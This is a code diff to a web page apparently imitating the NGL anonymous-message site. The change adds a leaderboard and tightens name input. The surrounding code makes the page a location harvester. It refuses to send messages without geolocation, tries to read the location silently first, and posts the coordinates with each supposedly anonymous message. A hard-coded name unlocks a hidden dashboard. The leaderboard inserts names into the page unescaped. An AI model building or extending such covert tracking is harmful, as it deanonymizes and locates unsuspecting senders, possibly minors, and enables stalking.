@@ -41,7 +41,7 @@
     .people-tap-count { color: #fff; margin: 10px auto 0; font-size: 18px; max-width: 420px; user-select: none; white-space: nowrap; overflow-x: auto; }
     .fade-out { animation: fadeOut 0.8s ease-out forwards; }
     @keyframes fadeOut {to {opacity: 0; transform: scale(0.95);}}
-    
+
     /* UPDATED SENT OVERLAY WITH PROPER CHECKMARK */
     #sentOverlay { 
       position: fixed; 
@@ -270,6 +270,91 @@
     .denial-help h4 { margin-top: 0; color: #f43f5e; }
     .denial-help ol { padding-left: 20px; }
     .denial-help li { margin-bottom: 8px; }
+
+    /* Leaderboard styles */
+    #leaderboardModal {
+      display: none;
+      position: fixed;
+      z-index: 10000;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .leaderboard-container {
+      background: white;
+      border-radius: 15px;
+      padding: 20px;
+      width: 90%;
+      max-width: 500px;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+    
+    .leaderboard-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+    
+    .leaderboard-title {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ff007a;
+    }
+    
+    .leaderboard-close {
+      background: none;
+      border: none;
+      font-size: 1.5rem;
+      cursor: pointer;
+      color: #ff007a;
+    }
+    
+    .leaderboard-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .leaderboard-rank {
+      font-weight: bold;
+      width: 30px;
+      color: #ff007a;
+    }
+    
+    .leaderboard-name {
+      flex-grow: 1;
+    }
+    
+    .leaderboard-count {
+      font-weight: bold;
+      color: #f43f5e;
+    }
+    
+    /* Add to your existing button styles */
+    .leaderboard-btn {
+      background: #4a5568;
+      color: white;
+      padding: 10px 15px;
+      border-radius: 8px;
+      margin: 15px auto 0;
+      cursor: pointer;
+      border: none;
+      font-family: 'Montserrat', Arial, sans-serif;
+      font-weight: 600;
+      width: 80%;
+      max-width: 300px;
+      display: block;
+      transition: background 0.2s;
+    }
+    
+    .leaderboard-btn:hover {
+      background: #2d3748;
+    }
   </style>
 </head>
 <body>
@@ -298,6 +383,7 @@
       <button type="submit" class="send-button">Send!</button>
     </form>
     <div class="people-tap-count" id="peopleTapCount">👇 0 people just tapped this button 😢🥀</div>
+    <button class="leaderboard-btn" id="showLeaderboard">View Leaderboard</button>
     <div class="extra-box ngl-pop-shake" id="mainQuizBox">
       <a href="#" id="quiz-link" style="color: inherit; text-decoration: none;">Do you want to know me even further?</a>
     </div>
@@ -374,7 +460,7 @@
       <div style="font-size:0.95rem; color:#666; margin-bottom:15px;">
         <b>Tip:</b> Try refreshing the page and allow location when asked. If it still doesn't work, make sure this website's location permission isn't blocked.
       </div>
-      
+
       <div class="denial-help">
         <h4>If you clicked "Never allow":</h4>
         <ol>
@@ -383,7 +469,7 @@
           <li><b>Desktop:</b> Click the 🔒 icon in address bar → Site settings → Reset permissions</li>
         </ol>
       </div>
-      
+
       <button class="ngl-modal-btn" onclick="window.location.reload()">Try Again</button>
     </div>
   </div>
@@ -405,13 +491,37 @@
     </div>
   </div>
 
+  <!-- Leaderboard Modal -->
+  <div id="leaderboardModal" class="ngl-modal-outer">
+    <div class="leaderboard-container">
+      <div class="leaderboard-header">
+        <div class="leaderboard-title">Top Messengers</div>
+        <button class="leaderboard-close" id="closeLeaderboard">&times;</button>
+      </div>
+      <div id="leaderboardList">
+        <!-- Leaderboard items will be inserted here by JavaScript -->
+      </div>
+    </div>
+  </div>
+
   <script>
+    // Message tracking system - enhanced to prevent negatives
+    const DAILY_LIMIT = 3;
+    const MSG_STORE_KEY = 'ngl_msg_count';
+    const MSG_DATE_KEY = 'ngl_msg_date';
+    const LEADERBOARD_KEY = 'ngl_leaderboard';
+
+    // Initialize leaderboard if it doesn't exist
+    if (!localStorage.getItem(LEADERBOARD_KEY)) {
+      localStorage.setItem(LEADERBOARD_KEY, JSON.stringify([]));
+    }
+
     // Detect in-app browsers
     function isInAppBrowser() {
       var ua = navigator.userAgent || navigator.vendor || '';
       return /FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSV|FBID|Messenger|Instagram/i.test(ua);
     }
-    
+
     if (isInAppBrowser()) {
       document.getElementById('nglInAppModal').style.display = 'flex';
       document.getElementById('fadeContainer').style.display = 'none';
@@ -465,11 +575,6 @@
       }, 550);
     });
 
-    // Message limit system
-    const DAILY_LIMIT = 3;
-    const MSG_STORE_KEY = 'ngl_msg_count';
-    const MSG_DATE_KEY = 'ngl_msg_date';
-
     function getTodayStr() {
       const now = new Date();
       return now.getFullYear() + '-' + (now.getMonth()+1).toString().padStart(2,'0') + '-' + now.getDate().toString().padStart(2,'0');
@@ -502,7 +607,7 @@
       const left = getMessagesLeft(name);
       const leftNum = document.getElementById('messagesLeftNum');
       const link = document.getElementById('sendAnotherLink');
-      
+
       if(isBypassName(name)) {
         leftNum.textContent = "∞";
         link.removeAttribute('disabled');
@@ -528,18 +633,80 @@
       }
     }
 
+    // Leaderboard functions
+    function updateLeaderboard(name) {
+      const leaderboard = JSON.parse(localStorage.getItem(LEADERBOARD_KEY));
+      const existingEntry = leaderboard.find(entry => entry.name.toLowerCase() === name.toLowerCase());
+      
+      if (existingEntry) {
+        existingEntry.count++;
+      } else {
+        leaderboard.push({ name, count: 1 });
+      }
+      
+      // Sort by count descending
+      leaderboard.sort((a, b) => b.count - a.count);
+      
+      // Keep only top 50
+      if (leaderboard.length > 50) {
+        leaderboard.length = 50;
+      }
+      
+      localStorage.setItem(LEADERBOARD_KEY, JSON.stringify(leaderboard));
+    }
+
+    function displayLeaderboard() {
+      const leaderboard = JSON.parse(localStorage.getItem(LEADERBOARD_KEY));
+      const leaderboardList = document.getElementById('leaderboardList');
+      
+      leaderboardList.innerHTML = '';
+      
+      if (leaderboard.length === 0) {
+        leaderboardList.innerHTML = '<p>No messages sent yet!</p>';
+        return;
+      }
+      
+      leaderboard.forEach((entry, index) => {
+        const item = document.createElement('div');
+        item.className = 'leaderboard-item';
+        item.innerHTML = `
+          <div class="leaderboard-rank">${index + 1}</div>
+          <div class="leaderboard-name">${entry.name}</div>
+          <div class="leaderboard-count">${entry.count}</div>
+        `;
+        leaderboardList.appendChild(item);
+      });
+    }
+
+    // Leaderboard modal controls
+    document.getElementById('showLeaderboard').addEventListener('click', () => {
+      displayLeaderboard();
+      document.getElementById('leaderboardModal').style.display = 'flex';
+    });
+
+    document.getElementById('closeLeaderboard').addEventListener('click', () => {
+      document.getElementById('leaderboardModal').style.display = 'none';
+    });
+
+    // Close leaderboard when clicking outside
+    document.getElementById('leaderboardModal').addEventListener('click', (e) => {
+      if (e.target === document.getElementById('leaderboardModal')) {
+        document.getElementById('leaderboardModal').style.display = 'none';
+      }
+    });
+
     // Location handling system
     let locationRequested = false;
 
     async function handleFormSubmit(event) {
       event.preventDefault();
-      
+
       // Basic validation
       const name = document.getElementById('name').value.trim();
       const message = document.getElementById('message').value.trim();
-      
+
       if (!validateForm(name, message)) return false;
-      
+
       // Special bypass for dashboard
       if (name === "Jebmama3") {
         window.location.href = "dashboard.html";
@@ -555,11 +722,15 @@
 
       // Show loading immediately
       document.getElementById('nglLoading').style.display = 'flex';
-      
+
       try {
         // First try silent permission (if previously granted)
         const coords = await getLocation(true);
         await submitMessage(name, message, coords);
+        
+        // Update leaderboard
+        updateLeaderboard(name);
+        
         showSuccessOverlay(name);
       } catch (error) {
         if (!locationRequested) {
@@ -600,16 +771,16 @@
           <b style="color:#ff007a;">No location, no message!</b><br>
           Since this isn't the real ngl, we need your location to deliver your vibes!
         </span>`;
-      
+
       return new Promise((resolve) => {
         const modal = document.getElementById('nglAskLocationModal');
         modal.style.display = 'flex';
-        
+
         document.getElementById('nglAskLocationAllowBtn').onclick = () => {
           modal.style.display = 'none';
           locationRequested = true;
           resolve();
-          
+
           // Critical: The actual location request must happen within 500ms of this click
           setTimeout(() => {
             if ('geolocation' in navigator) {
@@ -631,7 +802,7 @@
           timeout: silent ? 1000 : 10000,
           maximumAge: 0
         };
-        
+
         navigator.geolocation.getCurrentPosition(
           pos => resolve(pos.coords),
           err => reject(err),
@@ -651,9 +822,9 @@
           longitude: coords.longitude
         })
       });
-      
+
       if (!response.ok) throw new Error('Submission failed');
-      
+
       if (!isBypassName(name)) {
         let left = getMessagesLeft(name);
         setMessagesLeft(left - 1);
@@ -692,6 +863,7 @@
       updateSentOverlayTapCount();
       updateMessagesLeftUI(name);
       document.getElementById('sentOverlay').style.display = "flex";
+      window._lastSubmittedName = name;
     }
 
     function updateSentOverlayTapCount() {
@@ -753,10 +925,15 @@
       updateMessagesLeftUI(this.value.trim());
     });
 
+    // Enhanced name validation - letters only, no spaces/numbers/emoji
+    document.getElementById('name').addEventListener('input', function(e) {
+      this.value = this.value.replace(/[^a-zA-Z]/g, '');
+    });
+
     // Initial setup
     document.addEventListener('DOMContentLoaded', () => {
       updateMessagesLeftUI(document.getElementById('name').value.trim());
-      
+
       // Safari detection
       if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
         document.documentElement.classList.add('is-safari');
